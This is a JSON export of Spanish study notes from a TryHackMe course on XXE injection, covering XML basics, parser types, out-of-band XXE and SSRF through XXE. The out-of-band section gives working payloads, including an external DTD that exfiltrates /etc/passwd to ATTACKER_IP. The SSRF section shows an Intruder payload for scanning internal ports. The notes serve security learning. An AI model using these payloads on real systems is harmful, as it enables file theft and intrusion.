[
  {
    "title": "5. Exploiting XXE - Out-of-Band",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/5-exploiting-xxe-out-of-band/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/5. Exploiting XXE - Out-of-Band.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>Out-Of-Band XXE</h2>\nPor otro lado, para demostrar esta vulnerabilidad vamos a ir a `http://IP/index.php`. La aplicación usa el código de abajo cuando un usuario sube un archivo.\n\n```php\nlibxml_disable_entity_loader(false);\n$xmlData = file_get_contents('php://input'); \n\n$doc = new DOMDocument();\n$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$links = $doc->getElementsByTagName('file');\n\nforeach ($links as $link) {\n    $fileLink = $link->nodeValue;\n    $stmt = $conn->prepare(\"INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())\");\n    $stmt->bind_param(\"s\", $fileLink);\n    $stmt->execute();\n    \n    if ($stmt->affected_rows > 0) {\n        echo \"Link saved successfully.\";\n    } else {\n        echo \"Error saving link.\";\n    }\n    \n    $stmt->close();\n}\n```\n\nEl código de arriba no devuelve los valores de la información XML subida. Es por esto que usamos el término OOB, ya que la información exfiltrada tiene que ser capturada usando un sservidor controlado por el atacante.\n\nPara este ataque, necesitaremos un servidor que recibirá la información de otros servidores. Podemos usar el módulo `http.server` de Python aunque hay opciones como Apache o Nginx. Arranca un servidor de python usando el comando `python3 -m http.server PUERTO`.\n\nSube un archivo a la aplicación y monitoriza la petición que es mandada a `submit.php` usando Burp. Redirige la petición  al repetidor.\n\n![[Pasted image 20260112124531.png]]\n\nUsando el payload de abajo, reemplaza el valor del archivo XML en la petición y mándalo.\n\n```xml\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://ATTACKER_IP:1337/\" >]>\n<upload><file>&xxe;</file></upload>\n```\n\nManda la petición modificada.\n\n![[Pasted image 20260112124634.png]]\n\nDespués de mandar la petición HTTP modificada, el servidor Python recibirá una conexión de la máquina víctima. El establecimiento de conexión con el servidor indica que la información sensible puede ser extraída de la aplicación.\n\n![[Pasted image 20260112124820.png]]\n\nAhora podemos crear un DTD que contenga una entidad externa con un filtro PHP para exfiltrar información de la aplicación web.\n\nGuarda el ejemplo de DTD de abajo con el nombre `sample.dtd`. El payload de abajo exfiltrará los contenidos de `/etc/passwd` y mandará la respuesta a nuestro servidor:\n\n```xml\n<!ENTITY % cmd SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % oobxxe \"<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>\">\n%oobxxe;\n```\n\n<h4>Explicación del DTD</h4>\nEl DTD comienza con una declaración de una entidad `%cmd` que apunta a un recurso del sistema. La entidad `%cmd` refiere al recurso en el protocolo del filtro PHP `php://filter/convert.base64-encode/resource=/etc/passwd` devolviendo el contenido de `/etc/passwd`.El filtro `convert.base64-encode` encodea el contenido a base664 para evitar problemas de formato. La entidad `%oobxxe` contiene otra declaración de entidad XML, `exfil`, la cual tiene un identificador de sistema apuntando al servidor controlado por el atacante. Incluye un parámetro llamado `data` con `%cmd`, representando el contenido base64-encodeado de `/etc/passwd`. Cuando `%oobxxe;` se parsea, crea la entidad `exfil` que se conecta al servidor del atacante. El parámetro `?data=%cmd` manda el contenido de `%cmd` encodeado en base64.\n\nVuelve al repetidor y cambia el payload a:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE upload SYSTEM \"http://ATTACKER_IP:1337/sample.dtd\">\n<upload>\n    <file>&exfil;</file>\n</upload>\n```\n\n![[Pasted image 20260112135242.png]]\n\nVuelve a mandar la peticióon y revissa tu terminal. Recibirás 2 peticiones. La primera es la petición del `sample.dtd` y la segunda es la petición mandada por la aplicación vulnerable que contiene el `/etc/passwd` encodeado.\n\n![[Pasted image 20260112135344.png]]\n\nDecodificar la información exfiltrada de base64 mostrará el contenido de `/etc/passwd`.\n\n![[Pasted image 20260112135427.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "3. XML Parsing Mechanisms",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/3-xml-parsing-mechanisms/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/3. XML Parsing Mechanisms.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>Parsing XML</h2>\nEl parsing XML es el proceso por el cual un archivo XML es leído y su información accedida y manipulada por un programa. Los parsers XML conviertan información de XML a una estructura que el programa pueda usar (como un árbol DOM). Durante este proceso, los parsers pueden validar la información XML contra un esquema o un DTD, asegurando que la estructura se ajusta a ciertas reglas.\n\nSi un parser se configura para procesar entidades externas, puede llevar a acceso no autprizado de archivos, sistemas o páginas web.\n\n----------------------------------------\n<h2>Parsers XML Comunes</h2>\nSe usan múltiples parsers XML a través de diferentes entornos. Cada parser puede manejar la información XML de manera diferente.\n\n- **Parser DOM (Document Object Model):** Este método construye el documento XML entero en una estructura basada en arbol permitiendo acceso aleatorio a todas las partes del documento. Es intensivo de recursos pero muy flexible.\n- **Parser SAX (Simple API dor XML):** Parsea la información XML secuencialemente sin cargar el documento entero en memoriam haciéndolo adecuado para documentos XML grandes. Sin embargo, es menos flexible para acceder a la información XML.\n- **Parser StAX (Streaming API for XML):** Similar a SAX, StAX parsea el documento XML de una forma de cascada pero le da al programador más contro, sobre el proceso de parseado.\n- **Parser XPath:** Parsea el documento XML basado en expresiones y se usa de forma extensiva junto a XSLT.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "6. SSRF and XXE",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/6-ssrf-and-xxe/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/6. SSRF and XXE.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "Los ataques SSRF (Server-Side Request Forgery) ocurren cuando un atacante abusa una funcionalidad en el servidor causando que este haga peticiones a una localización que no pretendía originalmente. En el contexto de XXE, un atacante puede manipular el input XML para hacer que el servidor haga peticiones a un servicio o archivo interno. Esta técnica se puede usar tanto para escanear redes internas, acceder a endpoints restringidos o interactuar con los servicios que sólo son accesibles desde la red local del servidor.\n\n-------------------------------------------------\n<h2>Escaneo de Red Interna</h2>\nConsidera un escenario donde un servidor vulnerable alberga una aplicación web internamente en un puerto no estándar. Un atacante puede explotar una vulnerabilidad XXE que hace que el servidor mande una petición a su propio recurso de red interna.\n\nPor ejemplo, usando la petición capturada de la in-band XXE, mándala al intruder y usa el payload de abajo:\n\n```xml\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"http://localhost:§10§/\" >\n]>\n<contact>\n  <name>&xxe;</name>\n  <email>test@test.com</email>\n  <message>test</message>\n</contact>\n```\n\nLa entidad externa está configurada para recopilar información de `http://localhost:§10§/`. El intruder reiterará la petición y buscará servicios internos corriendo en el servidor.\n\n<h4>Pasos para aplicar fuerza bruta en busca de puertos abiertos:</h4>\n1. Una vez que la petición capturada de la in-band XXE esté en el intruder, haz click en el botón `Add §` mientras subrayas el puerto.\n   ![[Pasted image 20260112141608.png]]\n2. En la pestaña `Payloads`, configura el tipo de payload a `Numbers` de `1-65535`.\n   ![[Pasted image 20260112141649.png]]\n3. Una vez hecho, haz click en el botón de comenzar el ataque y haz click en la columna de `Length` para ordenar los ítems de mayor a menor. La diferencia en la respuesta del servidor indicará que requiere investigación ya que puede contener información diferente a la mayoría de peticiones.\n   ![[Pasted image 20260112141820.png]]\n   ![[Pasted image 20260112141827.png]]\n\n<h4>Cómo procesa esto el Servidor:</h4>\nLa entidad `&xxe;` se rederencia dentro del tag `<name>`, provocando que el servidor haga una petición HTTP a la URL especificada cuando se parsea el XML. La respuesta del recurso pedido será incluida en la respuesta del servidor. Si la aplicación contiene claves secretas, claves de API o contraseñas hardcodeadas, esta información podrá ser usada como otra forma de ataque como reutilización de contraseña.\n\n-----------------------------------------\n<h2>Implicaciones Potenciales de Seguridad</h2>\n- **Reconocimiento:** Los atacantes pueden descubrir puertos de red internos y ganar acceso a la arquitectura interna del servidor.\n- **Filtrado de Información:** Si el servicio interno devuelve información sensible, podría ser expuesta a través de errores o output XML.\n- **Elevación de Privilegios:** Acceder a servicios internos podría conllevar a exploits más avanzados escalando las capacidades de un atacante en la red.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "2. Exploring XML",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/2-exploring-xml/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/2. Exploring XML.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>¿Qué es XML?</h2>\nXML (Extensible Markup Language) es un lenguaje de marcas derivado de SGML (Standard Generalized Markup Language), el cual es el mismo estándar en el que está basado HTML. XML es usado típicamente por aplicaciones para guardar y transportar información en un formato que sea legible para los humanos y parseable para las máquinas. Es flexible y ampliamente usado para intercambiar información entre diferentes sistemas y aplicaciones. XML consta de elementos, atributos e información, que son usados para representar información de forma estructurada.\n\n---------------------------------------------\n<h2>Sintaxis y Estructura de XML</h2>\nLos elementos XML se representan con etiquetas, que se rodean por los símbolos `<` y `>`. Las etiquetas suelen venir en pares, con la apertura precediendo al contenido y la cola al final. Por ejemplo:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user id=\"1\">\n   <name>John</name>\n   <age>30</age>\n   <address>\n      <street>123 Main St</street>\n      <city>Anytown</city>\n   </address>\n</user>\n```\n\nEl tag `<name>John</name>` representa un elemento llamado \"name\" con el contenido \"John\". Los atributos ofrecen información adicional sobre los elementos y se especifican en el tag de apertura. El tag `<user id='1'>` especifica un atributo \"id\" con valor \"1\" para el elemento \"user\". La información de caracteres se refiere al contenido como \"John\".\n\nEl ejemplo de arriba muestra un XML con elementos, atributos e información de caracteres. La declaración del tag `<?xml version=\"1.0\" encoding=\"UTF-8\"?>` indica la versión XML y el elemento contiene varios subelementos y atributos que representan la información del usuario.\n\n----------------------------------\n<h2>Casos de Uso Comunes en Aplicaciones Web</h2>\nEs ampliamente usado en las aplicaciones web para intercambiar informaciión, almacenamiento y configuración. Se usa comúnmente en servicios web y APIs, como SOAP y REST, para intercambiar información entre sistemas. XML también se usa para los archivos de configuración como la de los servidores web o aplicaciones.\n\n------------------------------------------\n<h2>¿Qué es XSLT?</h2>\nXSLT (Extensible Stylesheet Language Transformations) es un lenguaje usado para transformar y formatear documentos XML. Mientras que XSLT es principalmente usado para transformar información y formateo, también es relevante para los ataques XXE.\n\nXLST puede ser usado para facilitar los ataques XXE de varias maneras:\n\n1. **Extracción de Información:** XSLT puede ser usado para extraer información sensible de un documento XML, lo que puede ser usado en un ataque XXE, como por ejemplo credenciales de usuario.\n2. **Expansión de Entidad:** XSLT puede expandir entidades definidas en un documento XML, incluyendo entidades externas. Esto puede permitir que un atacante inyecte entidades maliciosas llevando a una vulnerabilidad XXE.\n3. **Manipulación de Información:** XSLT puede manipular la información en un documento XML, potencialmente permitiendo que un atacante pueda inyectar o modificar información existente para explotar una vulnerabilidad XXE.\n4. **XXE a Ciegas:** XSLT puede ser usado para realizar ataques XXE a ciegas, en los que el atacante inyecta entidades maliciosas sin ver la respuesta del servidor.\n\n--------------------------------\n<h2>¿Qué son los DTDs?</h2>\nDTDs o Document Type Definitions definen la estructura y restricciones de un documento XML. Especifican los elementos permitidos, atributos y relaciones entre ellos. Los DTDs pueden ser internoes en el documento XML o externos en un archivo separado.\n\nEl propósito de usar DTDs es:\n\n- **Validación:** Los DTDs validan la estructura de un XML para asegurar que encaja con los criterios especificados antes de procesarlo, lo que es crucial en entornos donde la integridad es clave.\n- **Declaración de Entidades:** Los DTDs definen entidades que pueden usarse a través del documento CML incluyendo las entidades externas que son clave en ataques XXE.\n\nLos DTDs internos se especifican usando la declaración `<!DOCTYPE`, mientras que los DTDs externos se referencian usando la palabra clave \"SYSTEM\".\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE config [\n<!ELEMENT config (database)>\n<!ELEMENT database (username, password)>\n<!ELEMENT username (#PCDATA)>\n<!ELEMENT password (#PCDATA)>\n]>\n<config>\n<!-- configuration data -->\n</config>\n```\n\nEl ejemplo muestra un DTD interno definiendo la estructura de un archivo de configuración. Las declaraciones `<!ELEMENT` especifican los elementos permitids y sus relaciones.\n\n----------------------------------\n<h2>DTDs y XXE</h2>\nLos DTDs juegan un rol crucial en la inyección XXE, ya que pueden usarse para declarar entidades externas. Las entidades externas pueden referenciar los archivos externos o URLs, las cuales pueden llevar a información maliciosa o inyección de código.\n\n--------------------------------------------\n<h2>Entidades XML</h2>\nLas entidades XML son placeholders de información o código que puede ser expandido en un documento XML. Hay 5 tipos de entidades: Internas, externas, paramétricas, generales y de caracteres.\n\nEjemplo de entidad externa:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY external SYSTEM \"http://example.com/test.dtd\">\n<config>\n&external;\n</config>\n```\n\nEsto muestra una entidad externa referenciando una URL. La referencia `&external;` en el documento XML será expandida a los contenidos de la URL referenciada.\n\n--------------------------------------\n<h2>Tipos de Entidades</h2>\n1. Las entidades internas son esencialemente variables usadas en un documento SML para definir y sustituir contenido que puede haber sido repetido múltiples veces. Se definen en los DTDs y pueden simplificar el manejo de información repetitiva. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY inf \"This is a test.\">\n]>\n<note>\n        <info>&inf;</info>\n</note>\n```\n   \n   En este ejemplo la entidad `&inf;` es reemplazada por su valor allá donde aparezca en el documento.\n\n2. Las entidades externas son similares a las internas, pero sus contenidos están referenciados desde fuera del documento XML como desde un archivo o URL separada. Esta funcionalidad puede ser explotada en ataques XXE (XML External Entity) si el procesador está configurado para resolver entidades externas. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY ext SYSTEM \"http://example.com/external.dtd\">\n]>\n<note>\n        <info>&ext;</info>\n</note>\n```\n   \n   Aquí, `&ext;` coge contenido de la URL especificada, lo que podría ser un riesgo de seguridad si la URL estuviese controlada por el atacante.\n\n3. Las entidades paramétricas son un tipo de entidad especial usado en los DTDs para definir estructuras reutilizables o incluir subconjunts DTD externos. Son particularmente útil oara modular los DTDs y para mantener aplicaciones XML a gran escala. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY % common \"CDATA\">\n<!ELEMENT name (%common;)>\n]>\n<note>\n        <name>John Doe</name>\n</note>\n```\n   \n   En este caso `%common;` se usa en el DTD para definir el tipo de dinformación que el elemento `name` debería contener.\n\n4. Las entidades generales son similares a las variables y pueden ser declaradas internamente o externamente. Son usadas para definir sustituciones que pueden usarde en el cuerpo del documento XML. Al contrario que las entidades paramétricas, las generales se usan en el contenido del documento. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY author \"John Doe\">\n]>\n<note>\n        <writer>&author;</writer>\n</note>\n```\n   \n   La entidad `&author;` es una entidad general usada para sustituir el nombre del autor donde se referencia en el documento.\n\n5. Las entidades de caracteres se usan para representar caracteres especiales o reversos que no pueden ser usados directamente en documentos XML. Estas entidades previenen que el parser malinterprete la sintaxis. Por ejemplo:\n   \n   - `&lt;` para menor que `<`.\n   - `&gt;` para mayor que `>`.\n   - `&amp;` para el ampersand `&`.\n   \n```xml\n<note>\n        <text>Use &lt; to represent a less-than symbol.</text>\n</note>\n```\n   \n   Este uso asegura que los caracteres especiales se procesen por el parser XML sin romper la estructura del documento.\n\nLa imagen de abajo muestra los tipos de entidades en una estructura DOM:\n\n![[Pasted image 20260112113141.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "0. XXE Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/0-xxe-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/0. XXE Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/1. Introduction]]\n[[2. Exploring XML]]\n[[3. XML Parsing Mechanisms]]\n[[4. Exploiting XXE - In-Band]]\n[[5. Exploiting XXE - Out-of-Band]]\n[[6. SSRF and XXE]]\n[[7. Mitigation]]",
    "modified": "2026-01-13T00:51:00"
  }
]